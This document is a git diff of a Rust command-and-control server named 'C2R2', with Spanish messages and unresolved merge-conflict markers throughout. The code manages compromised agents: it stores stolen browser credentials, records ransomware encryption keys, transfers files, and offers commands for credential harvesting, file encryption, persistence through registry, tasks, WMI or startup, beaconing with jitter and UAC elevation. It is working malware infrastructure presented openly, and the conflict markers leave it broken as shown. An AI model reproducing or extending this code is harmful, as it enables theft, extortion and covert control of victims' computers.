@@ -45,6 +45,7 @@ struct Args {
     #[arg(short, long, default_value_t = 4444)]
     port: u16,
 
+<<<<<<< HEAD
     /// Puerto para la API de Team Client (HTTP/WebSocket)
     #[arg(long = "api-port", default_value_t = 5555)]
     api_port: u16,
@@ -53,6 +54,8 @@ struct Args {
     #[arg(long = "api-password", default_value = "c2r2-secret")]
     api_password: String,
 
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     /// Modo verboso
     #[arg(short, long)]
     verbose: bool,
@@ -309,11 +312,26 @@ async fn handle_client(
     api_state: Arc<ApiState>,
     verbose: bool,
 ) {
+<<<<<<< HEAD
     info!("Nueva conexión TLS: [{}] desde {}", id, addr);
     println!(
         "{} {} {} {} {}",
         "🔐".bright_green(),
         "Nuevo cliente TLS".bright_white().bold(),
+=======
+    let addr = match stream.peer_addr() {
+        Ok(addr) => addr.to_string(),
+        Err(e) => {
+            warn!("Cliente [{}] desconectado antes de obtener dirección: {}", id, e);
+            return; // Cliente ya desconectado, salir
+        }
+    };
+
+    info!("Nueva conexión: [{}] desde {}", id, addr);
+    println!("{} {} {} {}",
+        "".bright_green(),
+        "Nuevo cliente".bright_white().bold(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         format!("[{}]", id).bright_cyan().bold(),
         format!("desde {}", addr).bright_white().dimmed(),
         "(encriptado)".bright_green().dimmed()
@@ -322,6 +340,7 @@ async fn handle_client(
     let (tx, mut rx) = mpsc::unbounded_channel::<String>();
     let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
 
+<<<<<<< HEAD
     // Create API agent info
     let api_agent_info = ApiAgentInfo {
         id,
@@ -337,6 +356,8 @@ async fn handle_client(
     // Register with API state
     api_state.add_agent(id, api_agent_info, tx.clone()).await;
 
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     {
         let mut clients = clients.lock().unwrap();
         clients.insert(
@@ -362,13 +383,13 @@ async fn handle_client(
                     let message = format!("{}\n", cmd);
                     if let Err(e) = writer.write_all(message.as_bytes()).await {
                         if verbose {
-                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
+                            eprintln!("{} Error enviando a [{}]: {}", "".bright_red(), id, e);
                         }
                         break;
                     }
                     if let Err(e) = writer.flush().await {
                         if verbose {
-                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
+                            eprintln!("{} Error flush [{}]: {}", "".bright_red(), id, e);
                         }
                         break;
                     }
@@ -389,11 +410,15 @@ async fn handle_client(
             match reader.read_line(&mut line).await {
                 Ok(0) => {
                     if verbose {
+<<<<<<< HEAD
                         println!(
                             "{} Cliente {} desconectado",
                             "🔌".bright_red(),
                             format!("[{}]", id).bright_cyan()
                         );
+=======
+                        println!("{} Cliente {} desconectado", "".bright_red(), format!("[{}]", id).bright_cyan());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                     }
                     return;
                 }
@@ -420,9 +445,14 @@ async fn handle_client(
                                     });
                                     info!("[{}] SYSINFO hostname: {}", id, value);
                                     if verbose {
+<<<<<<< HEAD
                                         println!(
                                             "{} {} hostname: {}",
                                             "📝".bright_green(),
+=======
+                                        println!("{} {} hostname: {}",
+                                            "".bright_green(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                             format!("[{}]", id).bright_cyan(),
                                             value.bright_white()
                                         );
@@ -441,9 +471,14 @@ async fn handle_client(
                                     });
                                     info!("[{}] SYSINFO username: {}", id, value);
                                     if verbose {
+<<<<<<< HEAD
                                         println!(
                                             "{} {} username: {}",
                                             "📝".bright_green(),
+=======
+                                        println!("{} {} username: {}",
+                                            "".bright_green(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                             format!("[{}]", id).bright_cyan(),
                                             value.bright_white()
                                         );
@@ -462,9 +497,14 @@ async fn handle_client(
                                     });
                                     info!("[{}] SYSINFO OS: {}", id, value);
                                     if verbose {
+<<<<<<< HEAD
                                         println!(
                                             "{} {} OS: {}",
                                             "📝".bright_green(),
+=======
+                                        println!("{} {} OS: {}",
+                                            "".bright_green(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                             format!("[{}]", id).bright_cyan(),
                                             value.bright_white()
                                         );
@@ -488,9 +528,14 @@ async fn handle_client(
                                         } else {
                                             value.bright_yellow().bold()
                                         };
+<<<<<<< HEAD
                                         println!(
                                             "{} {} privilegios: {}",
                                             "📝".bright_green(),
+=======
+                                        println!("{} {} privilegios: {}",
+                                            "".bright_green(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                             format!("[{}]", id).bright_cyan(),
                                             priv_colored
                                         );
@@ -527,9 +572,14 @@ async fn handle_client(
                                     response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                 error!("[{}] Error recibido: {}", id, error);
                                 println!();
+<<<<<<< HEAD
                                 println!(
                                     "{} {} {}",
                                     "❌".bright_red(),
+=======
+                                println!("{} {} {}",
+                                    "".bright_red(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                     "Error de".bright_white().bold(),
                                     format!("[{}]:", id).bright_cyan().bold()
                                 );
@@ -551,9 +601,14 @@ async fn handle_client(
                                     response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
                                 info!("[{}] Éxito: {}", id, msg);
                                 println!();
+<<<<<<< HEAD
                                 println!(
                                     "{} {} {}",
                                     "✅".bright_green(),
+=======
+                                println!("{} {} {}",
+                                    "".bright_green(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                     "Éxito de".bright_white().bold(),
                                     format!("[{}]:", id).bright_cyan().bold()
                                 );
@@ -667,6 +722,7 @@ async fn handle_client(
                                 let msg = response.strip_prefix("__INFO__:").unwrap_or(&response);
                                 info!("[{}] Info: {}", id, msg);
                                 println!();
+<<<<<<< HEAD
                                 println!(
                                     "{} {} {}",
                                     "ℹ️ ".bright_cyan(),
@@ -695,6 +751,11 @@ async fn handle_client(
                                     "{} {} {}",
                                     "📨".bright_blue(),
                                     "Response from".bright_white().bold(),
+=======
+                                println!("{} {} {}",
+                                    "".bright_blue(),
+                                    "Respuesta de".bright_white().bold(),
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                     format!("[{}]:", id).bright_cyan().bold()
                                 );
                                 println!("{}", "─".repeat(60).bright_black());
@@ -717,7 +778,7 @@ async fn handle_client(
                 }
                 Err(e) => {
                     if verbose {
-                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
+                        eprintln!("{} Error leyendo [{}]: {}", " ".bright_yellow(), id, e);
                     }
                     return;
                 }
@@ -735,7 +796,7 @@ async fn handle_client(
     clients.lock().unwrap().remove(&id);
     api_state.remove_agent(id).await;
     warn!("Cliente [{}] desconectado", id);
-    println!("❌ Cliente [{}] desconectado", id);
+    println!(" Cliente [{}] desconectado", id);
 }
 
 fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
@@ -744,7 +805,7 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
 
     if parts.len() != 4 {
         error!("[{}] Formato de archivo inválido en descarga", client_id);
-        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
+        eprintln!("{} Formato de archivo inválido", "".bright_red());
         return;
     }
 
@@ -753,11 +814,15 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
     let encoded_data = parts[3];
 
     if verbose {
+<<<<<<< HEAD
         println!(
             "{} Decodificando {} bytes de base64...",
             "🔄".bright_yellow(),
             encoded_data.len()
         );
+=======
+        println!("{} Decodificando {} bytes de base64...", "".bright_yellow(), encoded_data.len());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     }
 
     match base64_decode(encoded_data) {
@@ -767,11 +832,15 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
             // Crear directorio downloads si no existe
             if let Err(e) = fs::create_dir_all("downloads") {
                 error!("[{}] Error creando directorio downloads: {}", client_id, e);
+<<<<<<< HEAD
                 eprintln!(
                     "{} Error creando directorio downloads: {}",
                     "❌".bright_red(),
                     e
                 );
+=======
+                eprintln!("{} Error creando directorio downloads: {}", "".bright_red(), e);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 return;
             }
 
@@ -782,6 +851,7 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
                         client_id, file_name, file_size, save_path
                     );
                     println!();
+<<<<<<< HEAD
                     println!(
                         "{}",
                         "╔═══════════════════════════════════════════════════════════╗"
@@ -822,12 +892,26 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
                         client_id, save_path, e
                     );
                     eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
+=======
+                    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                    println!("{}", format!("║               ARCHIVO DESCARGADO [{}]", client_id).bright_green().bold());
+                    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+                    println!();
+                    println!("  {} {}", " Archivo:".bright_cyan().bold(), file_name.bright_white());
+                    println!("  {} {}", " Tamaño:".bright_cyan().bold(), format!("{} bytes", file_size).bright_white());
+                    println!("  {} {}", " Guardado:".bright_cyan().bold(), save_path.bright_white());
+                    println!();
+                }
+                Err(e) => {
+                    error!("[{}] Error guardando archivo '{}': {}", client_id, save_path, e);
+                    eprintln!("{} Error guardando archivo: {}", "".bright_red(), e);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 }
             }
         }
         Err(e) => {
             error!("[{}] Error decodificando base64: {}", client_id, e);
-            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
+            eprintln!("{} Error decodificando base64: {}", "".bright_red(), e);
         }
     }
 }
@@ -843,11 +927,15 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                     // Crear directorio harvested si no existe
                     if let Err(e) = fs::create_dir_all("harvested") {
                         error!("[{}] Error creando directorio harvested: {}", client_id, e);
+<<<<<<< HEAD
                         eprintln!(
                             "{} Error creando directorio harvested: {}",
                             "❌".bright_red(),
                             e
                         );
+=======
+                        eprintln!("{} Error creando directorio harvested: {}", "".bright_red(), e);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                         return;
                     }
 
@@ -862,6 +950,7 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
 
                             // Mostrar en consola con formato bonito
                             println!();
+<<<<<<< HEAD
                             println!(
                                 "{}",
                                 "╔═══════════════════════════════════════════════════════════╗"
@@ -878,6 +967,11 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                                 "╚═══════════════════════════════════════════════════════════╝"
                                     .bright_green()
                             );
+=======
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                            println!("{}", format!("║          CREDENCIALES OBTENIDAS [{}]", client_id).bright_green().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                             println!();
 
                             // Contar credenciales (líneas que contienen "Browser:")
@@ -886,6 +980,7 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                                 .filter(|line| line.trim().starts_with("Browser:"))
                                 .count();
 
+<<<<<<< HEAD
                             println!(
                                 "  {} {}",
                                 "📊 Total:".bright_cyan().bold(),
@@ -901,6 +996,11 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                                 "📄 Tamaño:".bright_cyan().bold(),
                                 format!("{} bytes", credentials_text.len()).bright_white()
                             );
+=======
+                            println!("  {} {}", " Total:".bright_cyan().bold(), format!("{} credenciales", cred_count).bright_white());
+                            println!("  {} {}", " Guardado:".bright_cyan().bold(), filename.bright_white());
+                            println!("  {} {}", " Tamaño:".bright_cyan().bold(), format!("{} bytes", credentials_text.len()).bright_white());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                             println!();
                             println!("{}", "─".repeat(60).bright_black());
                             println!("{}", credentials_text.bright_white());
@@ -909,11 +1009,12 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                         }
                         Err(e) => {
                             error!("[{}] Error guardando credenciales: {}", client_id, e);
-                            eprintln!("{} Error guardando credenciales: {}", "❌".bright_red(), e);
+                            eprintln!("{} Error guardando credenciales: {}", "".bright_red(), e);
                         }
                     }
                 }
                 Err(e) => {
+<<<<<<< HEAD
                     error!(
                         "[{}] Error convirtiendo credenciales a UTF-8: {}",
                         client_id, e
@@ -923,18 +1024,23 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                         "❌".bright_red(),
                         e
                     );
+=======
+                    error!("[{}] Error convirtiendo credenciales a UTF-8: {}", client_id, e);
+                    eprintln!("{} Datos decodificados no son UTF-8 válido: {}", "".bright_red(), e);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 }
             }
         }
         Err(e) => {
             error!("[{}] Error decodificando Base64: {}", client_id, e);
-            eprintln!("{} Error decodificando Base64: {}", "❌".bright_red(), e);
+            eprintln!("{} Error decodificando Base64: {}", "".bright_red(), e);
         }
     }
 }
 
 fn handle_ransomware_response(result: &str, client_id: ClientId) {
     println!();
+<<<<<<< HEAD
     println!(
         "{}",
         "╔═══════════════════════════════════════════════════════════╗".bright_yellow()
@@ -949,6 +1055,11 @@ fn handle_ransomware_response(result: &str, client_id: ClientId) {
         "{}",
         "╚═══════════════════════════════════════════════════════════╝".bright_yellow()
     );
+=======
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_yellow());
+    println!("{}", format!("║            RANSOMWARE RESULT [{}]", client_id).bright_yellow().bold());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_yellow());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     println!();
 
     // Parsear resultado
@@ -959,6 +1070,7 @@ fn handle_ransomware_response(result: &str, client_id: ClientId) {
             let key = parts[1];
             let encrypted_count = parts[3];
 
+<<<<<<< HEAD
             println!(
                 "  {} {}",
                 "✅ Encriptación completada".bright_green().bold(),
@@ -985,11 +1097,23 @@ fn handle_ransomware_response(result: &str, client_id: ClientId) {
                     .bright_red()
                     .bold()
             );
+=======
+            println!("  {} {}", " Encriptación completada".bright_green().bold(), "".bright_white());
+            println!("  {} {}", " Archivos encriptados:".bright_cyan().bold(), encrypted_count.bright_white());
+            println!();
+            println!("{}", "─".repeat(60).bright_black());
+            println!("  {} {}", " CLAVE DE DESENCRIPTACIÓN:".bright_red().bold(), "".bright_white());
+            println!("  {}", key.bright_yellow());
+            println!("{}", "─".repeat(60).bright_black());
+            println!();
+            println!("{}", "    GUARDA ESTA CLAVE - Es la única forma de recuperar los archivos".bright_red().bold());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             println!();
 
             // Guardar clave en archivo
             let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
             let filename = format!("harvested/ransomware_key_{}_{}.txt", client_id, timestamp);
+<<<<<<< HEAD
             if let Ok(_) = fs::write(
                 &filename,
                 format!(
@@ -1002,12 +1126,16 @@ fn handle_ransomware_response(result: &str, client_id: ClientId) {
                     "💾 Clave guardada en:".bright_cyan().bold(),
                     filename.bright_white()
                 );
+=======
+            if let Ok(_) = fs::write(&filename, format!("Client: {}\nTimestamp: {}\nKey: {}\n", client_id, timestamp, key)) {
+                println!("  {} {}", " Clave guardada en:".bright_cyan().bold(), filename.bright_white());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             }
         }
     } else if result.starts_with("OK:") {
         // Resultado de desencriptación
         let msg = result.strip_prefix("OK:").unwrap_or(result);
-        println!("  {} {}", "✅".bright_green(), msg.bright_white());
+        println!("  {} {}", "".bright_green(), msg.bright_white());
     } else {
         // Otro resultado
         println!("  {}", result.bright_white());
@@ -1132,7 +1260,15 @@ async fn main() {
     std::fs::create_dir_all(logs_dir).expect("No se pudo crear el directorio de logs");
 
     // Archivo rotativo diario para logs completos
+<<<<<<< HEAD
     let file_appender = RollingFileAppender::new(Rotation::DAILY, logs_dir, "c2r2-session.log");
+=======
+    let file_appender = RollingFileAppender::new(
+        Rotation::DAILY,
+        logs_dir,
+        "c2r2-session.log"
+    );
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // IMPORTANTE: Mantener el guard vivo durante toda la ejecución
     let (non_blocking, guard) = tracing_appender::non_blocking(file_appender);
@@ -1150,6 +1286,7 @@ async fn main() {
         .with_level(true)
         .init();
 
+<<<<<<< HEAD
     // Cargar configuración TLS
     let tls_config = match load_tls_config() {
         Ok(config) => config,
@@ -1167,6 +1304,8 @@ async fn main() {
 
     let tls_acceptor = TlsAcceptor::from(Arc::new(tls_config));
 
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     info!("╔══════════════════════════════════════════════════════════════╗");
     info!("║          C2R2 Server v2.0 TLS - Session Started            ║");
     info!("║          Listening: {}:{:<43}║", args.bind, args.port);
@@ -1191,6 +1330,7 @@ async fn main() {
         "╚═══════════════════════════════════════════════════════════╝".bright_cyan()
     );
     println!();
+<<<<<<< HEAD
     println!(
         "{} {}",
         "🔐 TLS Listening:".bright_green().bold(),
@@ -1216,8 +1356,13 @@ async fn main() {
         "🔑 Certs:".bright_yellow().bold(),
         format!("{}/", CERTS_DIR).bright_white()
     );
+=======
+    println!("{} {}", " Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
+    println!("{} {}", " Help:".bright_yellow().bold(), "/help".bright_white());
+    println!("{} {}", " Logs:".bright_yellow().bold(), format!("{}/", logs_dir).bright_white());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     if args.verbose {
-        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
+        println!("{}", " Verbose Mode: ON".bright_magenta());
     }
     println!();
 
@@ -1284,7 +1429,7 @@ async fn main() {
                     });
                 }
                 Err(e) => {
-                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
+                    eprintln!("{} {}", " Error:".bright_red().bold(), e);
                 }
             }
         }
@@ -1325,6 +1470,7 @@ async fn main() {
                     continue;
                 }
 
+<<<<<<< HEAD
                 match parts[0].as_str() {
                     "/help" => {
                         println!();
@@ -1461,6 +1607,60 @@ async fn main() {
                             table.set_format(*format::consts::FORMAT_BOX_CHARS);
 
                             // Header con colores
+=======
+            match parts[0].as_str() {
+                "/help" => {
+                    println!();
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!("{}", "                     COMANDOS DISPONIBLES".bright_cyan().bold());
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!();
+                    println!("  {} {:<20} {}", "".bright_yellow(), "/list", "Lista todos los clientes conectados con info".bright_white());
+                    println!("  {} {:<20} {}", "".bright_green(), "/select <id>", "Selecciona un cliente por ID".bright_white());
+                    println!("  {} {:<20} {}", "".bright_blue(), "/cmd <comando>", "Envía comando al cliente seleccionado".bright_white());
+                    println!("  {} {:<20} {}", "".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
+                    println!("  {} {:<20} {}", "".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
+                    println!("  {} {:<20} {}", "".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
+                    println!("  {} {:<20} {}", "".bright_red(), "/harvest", "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)".bright_white());
+                    println!("  {} {:<20} {}", "".bright_red(), "/encrypt <ruta> [depth]", "Encripta archivos en directorio (default depth=5)".bright_white());
+                    println!("  {} {:<20} {}", "".bright_green(), "/decrypt <ruta> <key> [depth]", "Desencripta archivos con clave".bright_white());
+                    println!("  {} {:<20} {}", "".bright_magenta(), "/persist <method>", "Establece persistencia (registry|task|wmi|startup)".bright_white());
+                    println!("  {} {:<20} {}", "".bright_yellow(), "/persist_remove", "Remueve persistencia del cliente".bright_white());
+                    println!("  {} {:<20} {}", "".bright_blue(), "/beacon <int:jit>", "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white());
+                    println!("  {} {:<20} {}", "⬆ ".bright_red(), "/elevate", "Re-ejecuta agente como admin (UAC prompt, después todos los cmds son admin)".bright_white());
+                    println!("  {} {:<20} {}", "ℹ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
+                    println!("  {} {:<20} {}", "".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
+                    println!("  {} {:<20} {}", "".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
+                    println!("  {} {:<20} {}", "".bright_cyan(), "/help", "Muestra este menú".bright_white());
+                    println!();
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!();
+                }
+                "/list" => {
+                    let clients = clients.lock().unwrap();
+                    if clients.is_empty() {
+                        println!("{}", "  No hay clientes conectados".bright_yellow());
+                    } else {
+                        println!();
+                        let mut table = Table::new();
+                        table.set_format(*format::consts::FORMAT_BOX_CHARS);
+
+                        // Header con colores
+                        table.add_row(Row::new(vec![
+                            Cell::new("ID").style_spec("Fb"),
+                            Cell::new("Dirección").style_spec("Fb"),
+                            Cell::new("Hostname").style_spec("Fb"),
+                            Cell::new("Usuario").style_spec("Fb"),
+                            Cell::new("OS").style_spec("Fb"),
+                            Cell::new("Privilegios").style_spec("Fb"),
+                            Cell::new("Conectado").style_spec("Fb"),
+                        ]));
+
+                        for (id, client) in clients.iter() {
+                            let info = client.info.lock().unwrap();
+                            let priv_color = if info.privileges.as_deref() == Some("Admin") { "Fr" } else { "Fy" };
+
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                             table.add_row(Row::new(vec![
                                 Cell::new("ID").style_spec("Fb"),
                                 Cell::new("Dirección").style_spec("Fb"),
@@ -1470,6 +1670,7 @@ async fn main() {
                                 Cell::new("Privilegios").style_spec("Fb"),
                                 Cell::new("Conectado").style_spec("Fb"),
                             ]));
+<<<<<<< HEAD
 
                             for (id, client) in clients.iter() {
                                 let info = client.info.lock().unwrap();
@@ -1489,6 +1690,162 @@ async fn main() {
                                         .style_spec(priv_color),
                                     Cell::new(&info.connected_at).style_spec("Fd"),
                                 ]));
+=======
+                        }
+
+                        println!("{}", format!(" {} cliente(s) conectado(s)", clients.len()).bright_green().bold());
+                        table.printstd();
+                        println!();
+                    }
+                }
+                "/info" => {
+                    if parts.len() < 2 {
+                        println!("{} /info <id>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    if let Ok(id) = parts[1].parse::<ClientId>() {
+                        let clients = clients.lock().unwrap();
+                        if let Some(client) = clients.get(&id) {
+                            let info = client.info.lock().unwrap();
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+                            println!("{}", format!("║              INFORMACIÓN DEL CLIENTE [{}]                ║", id).bright_cyan().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+                            println!();
+                            println!("  {} {}", " ID:".bright_green().bold(), id.to_string().bright_white());
+                            println!("  {} {}", " Dirección:".bright_green().bold(), info.addr.bright_white());
+                            println!("  {} {}", " Hostname:".bright_green().bold(), info.hostname.as_deref().unwrap_or("N/A").bright_white());
+                            println!("  {} {}", " Usuario:".bright_green().bold(), info.username.as_deref().unwrap_or("N/A").bright_white());
+                            println!("  {} {}", "  OS:".bright_green().bold(), info.os_version.as_deref().unwrap_or("N/A").bright_white());
+
+                            let priv_str = info.privileges.as_deref().unwrap_or("N/A");
+                            let priv_colored = if priv_str == "Admin" {
+                                priv_str.bright_red().bold()
+                            } else {
+                                priv_str.bright_yellow().bold()
+                            };
+                            println!("  {} {}", " Privilegios:".bright_green().bold(), priv_colored);
+                            println!("  {} {}", "⏰ Conectado:".bright_green().bold(), info.connected_at.bright_white());
+                            println!();
+                        } else {
+                            println!("{} Cliente {} no encontrado", "".bright_red(), id);
+                        }
+                    } else {
+                        println!("{} ID inválido", "".bright_red());
+                    }
+                }
+                "/select" => {
+                    if parts.len() < 2 {
+                        println!("{} /select <id>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    if let Ok(id) = parts[1].parse::<ClientId>() {
+                        let clients = clients.lock().unwrap();
+                        if clients.contains_key(&id) {
+                            *selected_client.lock().unwrap() = Some(id);
+                            println!("{} {}", " Cliente".bright_green(), format!("[{}]", id).bright_cyan().bold());
+                            println!("{}", "   Usa /cmd <comando> para enviar comandos".bright_white().dimmed());
+                        } else {
+                            println!("{} Cliente {} no encontrado", "".bright_red(), id);
+                        }
+                    } else {
+                        println!("{} ID inválido", "".bright_red());
+                    }
+                }
+                "/deselect" => {
+                    *selected_client.lock().unwrap() = None;
+                    println!("{}", " Cliente deseleccionado".bright_green());
+                }
+                "/download" => {
+                    if parts.len() < 2 {
+                        println!("{} /download <ruta_remota>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    let remote_path = parts[1..].join(" ");
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            let command = format!("__DOWNLOAD__:{}", remote_path);
+                            info!("[{}] Comando /download: {}", id, remote_path);
+                            if let Err(e) = client.tx.send(command) {
+                                error!("[{}] Error enviando comando download: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            } else {
+                                println!("{} Solicitando descarga de: {}",
+                                    "".bright_cyan(),
+                                    remote_path.bright_white()
+                                );
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/upload" => {
+                    if parts.len() < 3 {
+                        println!("{} /upload <archivo_local> <ruta_remota>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    let local_path = &parts[1];
+                    let remote_path = parts[2..].join(" ");
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        // Verificar si el path remoto es un directorio (termina en \)
+                        let final_remote_path = if remote_path.ends_with('\\') || remote_path.ends_with('/') {
+                            // Si es directorio, agregar el nombre del archivo local
+                            let filename = std::path::Path::new(local_path)
+                                .file_name()
+                                .and_then(|n| n.to_str())
+                                .unwrap_or("uploaded_file");
+                            format!("{}{}", remote_path, filename)
+                        } else {
+                            remote_path
+                        };
+
+                        // Leer archivo local
+                        match fs::read(local_path) {
+                            Ok(file_data) => {
+                                let encoded = base64_encode(&file_data);
+                                let command = format!("__UPLOAD__|{}|{}", final_remote_path, encoded);
+
+                                info!("[{}] Comando /upload: {} -> {} ({} bytes)", id, local_path, final_remote_path, file_data.len());
+
+                                let clients = clients.lock().unwrap();
+                                if let Some(client) = clients.get(&id) {
+                                    if let Err(e) = client.tx.send(command) {
+                                        error!("[{}] Error enviando comando upload: {}", id, e);
+                                        println!("{} {}", " Error:".bright_red().bold(), e);
+                                    } else {
+                                        println!();
+                                        println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+                                        println!("{}", format!("║               SUBIENDO ARCHIVO [{}]", id).bright_cyan().bold());
+                                        println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+                                        println!();
+                                        println!("  {} {}", " Local:".bright_green().bold(), local_path.bright_white());
+                                        println!("  {} {}", " Remoto:".bright_green().bold(), final_remote_path.bright_white());
+                                        println!("  {} {}", " Tamaño:".bright_green().bold(), format!("{} bytes", file_data.len()).bright_white());
+                                        println!();
+                                    }
+                                } else {
+                                    println!("{} Cliente {} desconectado", "".bright_red(), id);
+                                    *selected_client.lock().unwrap() = None;
+                                }
+                            }
+                            Err(e) => {
+                                error!("[{}] Error leyendo archivo local '{}': {}", id, local_path, e);
+                                println!("{} Error leyendo archivo local '{}': {}", "".bright_red(), local_path, e);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                             }
 
                             println!(
@@ -1500,6 +1857,7 @@ async fn main() {
                             table.printstd();
                             println!();
                         }
+<<<<<<< HEAD
                     }
                     "/info" => {
                         if parts.len() < 2 {
@@ -1588,6 +1946,512 @@ async fn main() {
                                     "{} {}",
                                     "✅ Cliente".bright_green(),
                                     format!("[{}]", id).bright_cyan().bold()
+=======
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/harvest" => {
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /harvest: Robando credenciales de browsers", id);
+
+                            // Verificar que existan los archivos del módulo
+                            let modules_dir = get_modules_path();
+                            let stealer_enc_path = modules_dir.join("stealer.enc");
+                            let stealer_key_path = modules_dir.join("stealer.key");
+
+                            if !stealer_enc_path.exists() {
+                                println!("{}", " Error: stealer.enc no encontrado".bright_red());
+                                println!("   Ruta buscada: {}", stealer_enc_path.display());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
+                                continue;
+                            }
+
+                            if !stealer_key_path.exists() {
+                                println!("{}", " Error: stealer.key no encontrado".bright_red());
+                                println!("   Ruta buscada: {}", stealer_key_path.display());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
+                                continue;
+                            }
+
+                            // Leer archivos
